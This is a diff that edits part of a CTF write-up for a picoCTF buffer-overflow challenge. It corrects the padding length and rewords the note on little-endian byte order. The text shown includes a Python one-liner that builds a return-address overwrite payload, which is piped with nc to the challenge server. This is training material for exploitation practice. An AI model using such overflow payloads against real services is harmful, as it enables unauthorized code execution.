@@ -132,10 +132,10 @@ $ nm ./vuln | grep "win"
 We can craft a payload using a Python3 one-liner:
 
 ```bash
-python3 -c 'import sys;sys.stdout.buffer.write(b"A" * 144 + b"\x08\x04\x91\xf6")'
+python3 -c 'import sys;sys.stdout.buffer.write(b"A" * 44 + b"\x08\x04\x91\xf6")'
 ```
 
-However, there is a problem with this payload. That's right, we didn't consider the endianess. We know from `Enumeration` that this artifact is little endian. If you don't know that that means, check out my [HTB: jeeves](https://github.com/k00l-beanz/k00l-beanz/tree/main/hackthebox/challenges/pwn/jeeves) writeup. In short, we'll need to reverse the bytes of the address:
+However, there is a problem with this payload: we didn’t account for endianness. From the [Enumeration](#enumeration), we know that this artifact is little-endian. If you're unfamiliar with endianness, you can refer to my [HTB: jeeves](https://github.com/k00l-beanz/k00l-beanz/tree/main/hackthebox/challenges/pwn/jeeves) writeup for more details. In short, we need to reverse the bytes of the address:
 
 ```bash
 #############################################
@@ -146,4 +146,4 @@ python3 -c 'import sys;sys.stdout.buffer.write(b"A" * 44 + b"\xf6\x91\x04\x08")'
 python3 -c 'import sys;sys.stdout.buffer.write(b"A" * 44 + b"\xf6\x91\x04\x08" + b"\n")' | nc saturn.picoctf.net 53259
 ```
 
-Which gets the flag.
+Which pwns the challenge.
